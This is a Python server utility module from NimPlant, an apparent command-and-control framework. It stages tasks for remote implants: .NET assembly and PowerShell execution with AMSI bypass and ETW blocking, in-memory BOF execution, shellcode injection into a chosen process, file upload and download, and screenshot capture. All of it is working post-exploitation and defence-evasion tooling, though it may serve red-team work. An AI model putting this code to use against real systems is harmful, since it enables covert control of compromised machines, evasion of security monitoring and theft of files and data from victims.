import base64
import binascii
import hashlib
import json
import os
import shlex
import sys
import traceback

from datetime import datetime
from struct import pack, calcsize
from gzip import decompress
from time import sleep
from typing import Optional, IO
from zlib import compress

from flask import Request

import server.util.commands as commands
from server.util.config import config
from server.util.crypto import encrypt_data
from server.util.db import db_nimplant_log, db_server_log
from server.util.nimplant import np_server, NimPlant


# Clear screen
def cls():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


# Timestamp function
TIMESTAMP_FORMAT = "%d/%m/%Y %H:%M:%S"
FILENAME_SAFE_TIMESTAMP_FORMAT = "%d-%m-%Y_%H-%M-%S"


def timestamp(filename_safe=False):
    if filename_safe:
        return datetime.now().strftime(FILENAME_SAFE_TIMESTAMP_FORMAT)
    else:
        return datetime.now().strftime(TIMESTAMP_FORMAT)


# Loop to check for late checkins (can be infinite - runs as separate thread)
def periodic_nimplant_checks():
    while True:
        np_server.check_late_nimplants()
        sleep(5)


# Log input and output to flat files per session
def log(message, target=None):
    np = np_server.get_nimplant_by_guid(target)

    log_directory = os.path.abspath(
        os.path.join(
            os.path.dirname(sys.argv[0]), "server", "logs", f"server-{np_server.name}"
        )
    )
    os.makedirs(log_directory, exist_ok=True)

    if target is not None and np is not None:
        log_file = f"session-{np.id}-{np.guid}.log"
    else:
        log_file = "console.log"

    log_file_path = os.path.join(log_directory, log_file)
    with open(log_file_path, "a", encoding="utf-8") as f:
        f.write(message + "\n")


# Print function to properly direct output
def nimplant_print(message, target=None, task=None, task_guid=None):
    np = np_server.get_nimplant_by_guid(target)
    if target is not None and np is not None:
        # Print to nimplant stream
        result = f"\x1b[1K\r[{timestamp()}|NP{np.id}] {message}"

        if task:
            # Log to database as server-side command (write command + result instantly)
            db_nimplant_log(np, task=task, task_friendly=task, result=message)

        elif task_guid:
            # Log to database as result of earlier task
            db_nimplant_log(np, task_guid=task_guid, result=message)

        else:
            # Log to database as message without task
            db_nimplant_log(np, result=message)

    else:
        # Print to console stream
        result = f"\x1b[1K\r[{timestamp()}] {message}"
        db_server_log(np_server, message)

    log(f"[{timestamp()}] {message}", target)
    print(result)


# Cleanly exit server
def exit_server():
    if np_server.has_active_nimplants():
        np_server.kill_all_nimplants()
        nimplant_print(
            "Waiting for all NimPlants to receive kill command... Do not force quit!"
        )
        while np_server.has_active_nimplants():
            sleep(1)

    nimplant_print("Exiting...")
    np_server.kill()
    os._exit(0)


# Exit wrapper for console use
def exit_server_console():
    if np_server.has_active_nimplants():
        check = (
            str(
                input(
                    "Are you sure you want to exit? This will kill ALL active NimPlants! (Y/N): "
                )
            )
            .lower()
            .strip()
        )
        if check[0] == "y":
            exit_server()
    else:
        exit_server()


# Pretty print function
def pretty_print(d):
    return json.dumps(d, sort_keys=True, indent=2, default=str)


# Help menu function
def get_help_menu():
    res = "NIMPLANT HELP\n"
    res += (
        "Command arguments shown as [required] <optional>.\n"
        "Commands with (GUI) can be run without parameters via the web UI.\n\n"
    )
    for c in commands.get_commands():
        res += f"{c['command']:<18}{c['description']:<75}\n"
    return res.rstrip()


# Print the help text for a specific command
def get_command_help(command):
    c = [c for c in commands.get_commands() if c["command"] == command]

    if not c:
        return "Help: Command not found."

    c = c[0]

    res = "NIMPLANT HELP\n"
    res += f"{c['command']} {c['description']}\n\n"
    res += c["help"]

    return res


# Get the server configuration as a YAML object
def get_config_json():
    res = {"GUID": np_server.guid, "Server Configuration": config}
    return json.dumps(res)


# Handle pre-processing for the 'execute-assembly' command
def execute_assembly(np: NimPlant, args, raw_command):
    # TODO: Make AMSI/ETW arg parsing more user-friendly
    amsi = "1"
    etw = "1"

    k = 0
    for i in range(len(args)):
        if args[i].startswith("BYPASSAMSI"):
            amsi = args[i].split("=")[-1]
            k += 1
        if args[i].startswith("BLOCKETW"):
            etw = args[i].split("=")[-1]
            k += 1

    try:
        file = args[k]
    except IndexError:
        nimplant_print(
            "Invalid number of arguments received. Usage: 'execute-assembly <BYPASSAMSI=0> <BLOCKETW=0> [localfilepath] <arguments>'.",
            np.guid,
            raw_command,
        )
        return

    # Check if assembly is provided as file path (normal use), GUI use is handled via API
    assembly = None
    try:
        if os.path.isfile(file):
            with open(file, "rb") as f:
                assembly = f.read()
        else:
            raise FileNotFoundError
    except:
        nimplant_print(
            "Invalid assembly file specified.",
            np.guid,
            raw_command,
        )
        return

    assembly = compress(assembly, level=9)
    assembly = encrypt_data(assembly, np.encryption_key)
    assembly_arguments = " ".join(args[k + 1 :])

    command = " ".join(
        shlex.quote(arg)
        for arg in ["execute-assembly", amsi, etw, assembly, assembly_arguments]
    )

    guid = np.add_task(command, task_friendly=raw_command)
    nimplant_print(
        "Staged execute-assembly command for NimPlant.", np.guid, task_guid=guid
    )


# Helper for packing BOF arguments
# Original source: COFFLoader by kev169 at TrustedSec
# https://github.com/trustedsec/COFFLoader/blob/main/beacon_generate.py
class BeaconPack:
    def __init__(self):
        self.buffer = b""
        self.size = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addshort(self, short):
        self.buffer += pack("<h", short)
        self.size += 2

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addWstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-16_le")
        fmt = "<L{}s".format(len(s) + 2)
        self.buffer += pack(fmt, len(s) + 2, s)
        self.size += calcsize(fmt)

    def addbin(self, s):
        try:
            s = base64.b64decode(s)
        except:  # not b64, try raw encoding
            if isinstance(s, str):
                s = s.encode("utf-8")

        fmt = "<L{}s".format(len(s))
        self.buffer += pack(fmt, len(s), s)
        self.size += calcsize(fmt)


# Handle pre-processing for the 'inline-execute' command
def inline_execute(np: NimPlant, args, raw_command):
    try:
        file = args[0]
        entry_point = args[1]
        assembly_arguments = list(args[2:])
    except:
        nimplant_print(
            "Invalid number of arguments received.\nUsage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.",
            np.guid,
            raw_command,
        )
        return

    # Check if BOF file path is provided correctly
    if os.path.isfile(file):
        with open(file, "rb") as f:
            assembly = f.read()
    else:
        nimplant_print(
            "Invalid BOF file specified.",
            np.guid,
            raw_command,
        )
        return

    assembly = compress(assembly, level=9)
    assembly = encrypt_data(assembly, np.encryption_key)

    # Pre-process BOF arguments
    # Check if list of arguments consists of argument-type pairs
    args_binary = ["binary", "bin", "b"]
    args_integer = ["integer", "int", "i"]
    args_short = ["short", "s"]
    args_string = ["string", "z"]
    args_wstring = ["wstring", "Z"]
    args_all = args_binary + args_integer + args_short + args_string + args_wstring

    if len(assembly_arguments) != 0:
        if not len(assembly_arguments) % 2 == 0:
            nimplant_print(
                "BOF arguments not provided as arg-type pairs.\n"
                "Usage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.\n"
                "Example: 'inline-execute dir.x64.o go C:\\Users\\Testuser\\Desktop wstring'",
                np.guid,
                raw_command,
            )
            return

        # Pack every argument-type pair
        buffer = BeaconPack()
        arg_pair_list = zip(assembly_arguments[::2], assembly_arguments[1::2])
        for arg_pair in arg_pair_list:
            arg = arg_pair[0]
            argument_type = arg_pair[1]

            try:
                if argument_type in args_binary:
                    buffer.addbin(arg)
                elif argument_type in args_integer:
                    buffer.addint(int(arg))
                elif argument_type in args_short:
                    buffer.addshort(int(arg))
                elif argument_type in args_string:
                    buffer.addstr(arg)
                elif argument_type in args_wstring:
                    buffer.addWstr(arg)
                else:
                    nimplant_print(
                        "Invalid argument type provided.\n"
                        f"Valid argument types (case-sensitive): {', '.join(args_all)}.",
                        np.guid,
                        raw_command,
                    )
                    return

            except ValueError:
                nimplant_print(
                    "Invalid integer or short value provided.\nUsage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.\n"
                    "Example: 'inline-execute createremotethread.x64.o go 1337 i [b64shellcode] b'",
                    np.guid,
                    raw_command,
                )
                return

        assembly_args_final = str(binascii.hexlify(buffer.getbuffer()), "utf-8")
    else:
        assembly_args_final = ""

    command = " ".join(
        shlex.quote(arg)
        for arg in ["inline-execute", assembly, entry_point, assembly_args_final]
    )

    guid = np.add_task(command, task_friendly=raw_command)
    nimplant_print(
        "Staged inline-execute command for NimPlant.", np.guid, task_guid=guid
    )


# Handle pre-processing for the 'powershell' command
def powershell(np: NimPlant, args, raw_command):
    amsi = "1"
    etw = "1"

    k = 0
    for i in range(len(args)):
        if args[i].startswith("BYPASSAMSI"):
            amsi = args[i].split("=")[-1]
            k += 1
        if args[i].startswith("BLOCKETW"):
            etw = args[i].split("=")[-1]
            k += 1

    powershell_cmd = " ".join(args[k:])

    if powershell_cmd == "":
        nimplant_print(
            "Invalid number of arguments received. Usage: 'powershell <BYPASSAMSI=0> <BLOCKETW=0> [command]'.",
            np.guid,
            raw_command,
        )
        return

    command = " ".join(
        shlex.quote(arg) for arg in ["powershell", amsi, etw, powershell_cmd]
    )

    guid = np.add_task(command, task_friendly=raw_command)
    nimplant_print("Staged powershell command for NimPlant.", np.guid, task_guid=guid)


# Handle pre-processing for the 'shinject' command
def shinject(np: NimPlant, args, raw_command):
    try:
        process_id, file_path = args[0:2]
    except:
        nimplant_print(
            "Invalid number of arguments received. Usage: 'shinject [PID] [localfilepath]'.",
            np.guid,
            raw_command,
        )
        return

    if os.path.isfile(file_path):
        with open(file_path, "rb") as f:
            shellcode = f.read()

        shellcode = compress(shellcode, level=9)
        shellcode = encrypt_data(shellcode, np.encryption_key)

        command = " ".join(
            shlex.quote(arg) for arg in ["shinject", process_id, shellcode]
        )

        guid = np.add_task(command, task_friendly=raw_command)
        nimplant_print("Staged shinject command for NimPlant.", np.guid, task_guid=guid)

    else:
        nimplant_print(
            "Shellcode file to inject does not exist.",
            np.guid,
            raw_command,
        )


# Handle pre-processing for the 'upload' command
def upload_file(np: NimPlant, args, raw_command):
    if len(args) == 1:
        file_path = args[0]
        remote_path = ""
    elif len(args) == 2:
        file_path = args[0]
        remote_path = args[1]
    else:
        nimplant_print(
            "Invalid number of arguments received. Usage: 'upload [local file] <optional: remote destination path>'.",
            np.guid,
            raw_command,
        )
        return

    file_name = os.path.basename(file_path)
    file_id = hashlib.md5(file_path.encode("UTF-8")).hexdigest()

    if os.path.isfile(file_path):
        np.host_file(file_path)
        command = " ".join(
            shlex.quote(arg) for arg in ["upload", file_id, file_name, remote_path]
        )

        guid = np.add_task(command, task_friendly=raw_command)
        nimplant_print("Staged upload command for NimPlant.", np.guid, task_guid=guid)

    else:
        nimplant_print("File to upload does not exist.", np.guid, raw_command)


# Handle pre-processing for the 'download' command
def download_file(np: NimPlant, args, raw_command):
    if len(args) == 1:
        file_path = args[0]
        file_name = file_path.replace("/", "\\").split("\\")[-1]
        local_path = (
            f"server/downloads/server-{np_server.guid}/nimplant-{np.guid}/{file_name}"
        )
    elif len(args) == 2:
        file_path = args[0]
        local_path = args[1]
    else:
        nimplant_print(
            "Invalid number of arguments received. Usage: 'download [remote file] <optional: local destination path>'.",
            np.guid,
            raw_command,
        )
        return

    os.makedirs(os.path.dirname(local_path), exist_ok=True)
    np.receive_file(local_path)
    command = " ".join(shlex.quote(arg) for arg in ["download", file_path])

    guid = np.add_task(command, task_friendly=raw_command)
    nimplant_print("Staged download command for NimPlant.", np.guid, task_guid=guid)


# Handle post-processing of the 'screenshot' command
# This function is called based on the blob header b64(gzip(screenshot)), so we don't need to verify the format
def process_screenshot(np: NimPlant, sc_blob) -> str:
    sc_blob = decompress(base64.b64decode(sc_blob))

    path = f"server/downloads/server-{np_server.guid}/nimplant-{np.guid}/screenshot_{timestamp(filename_safe=True)}.png"
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "wb") as f:
        f.write(sc_blob)

    return f"Screenshot saved to '{path}'."


# Get last lines of file
# Credit 'S.Lott' on StackOverflow: https://stackoverflow.com/questions/136168/get-last-n-lines-of-a-file-similar-to-tail
def tail(f: IO[bytes], lines):
    block_size = 1024
    total_lines_wanted = lines
    f.seek(0, 2)
    block_end_byte = f.tell()
    lines_to_go = total_lines_wanted
    block_number = -1
    blocks = []
    while lines_to_go > 0 and block_end_byte > 0:
        if block_end_byte - block_size > 0:
            f.seek(block_number * block_size, 2)
            blocks.append(f.read(block_size))
        else:
            f.seek(0, 0)
            blocks.append(f.read(block_end_byte))
        lines_found = blocks[-1].count(b"\n")
        lines_to_go -= lines_found
        block_end_byte -= block_size
        block_number -= 1
    all_read_text = b"".join(reversed(blocks))
    return b"\n".join(all_read_text.splitlines()[-total_lines_wanted:])


def tail_nimplant_log(np: NimPlant = None, lines=100):
    log_directory = os.path.abspath(
        os.path.join(
            os.path.dirname(sys.argv[0]), "server", "logs", f"server-{np_server.name}"
        )
    )

    if np:
        log_file = f"session-{np.id}-{np.guid}.log"
        nimplant_id = np.guid
    else:
        log_file = "console.log"
        nimplant_id = "CONSOLE"

    log_file_path = os.path.join(log_directory, log_file)

    if os.path.exists(log_file_path):
        with open(log_file_path, "rb") as f:
            log_contents = tail(f, lines).decode("utf8")
    else:
        lines = 0
        log_contents = ""

    return {"id": nimplant_id, "lines": lines, "result": log_contents}


# Define a utility function to easily get the 'real' IP from a request
def get_external_ip(request: Request):
    if request.headers.get("X-Forwarded-For"):
        return request.access_route[0]
    else:
        return request.remote_addr


def dump_debug_info_for_exception(
    error: Exception, request: Optional[Request] = None
) -> None:
    # Capture the full traceback as a string
    traceback_str = "".join(
        traceback.format_exception(type(error), error, error.__traceback__)
    )

    # Log detailed error information
    nimplant_print("Detailed traceback:")
    nimplant_print(traceback_str)

    # Additional request context
    request_headers = dict(request.headers)
    request_method = request.method
    request_path = request.path
    request_query_string = request.query_string.decode("utf-8")
    request_remote_addr = request.remote_addr
    try:
        request_body_snippet = request.get_data(as_text=True)[
            :200
        ]  # Log only the first 200 characters
    except Exception as e:
        request_body_snippet = "Error reading request body: " + str(e)

    # Environment details
    environment_details = {
        "REQUEST_METHOD": request_method,
        "PATH_INFO": request_path,
        "QUERY_STRING": request_query_string,
        "REMOTE_ADDR": request_remote_addr,
        "REQUEST_HEADERS": request_headers,
        "REQUEST_BODY_SNIPPET": request_body_snippet,
    }

    # Log additional context
    nimplant_print("Request Details:")
    nimplant_print(json.dumps(environment_details, indent=4, ensure_ascii=False))
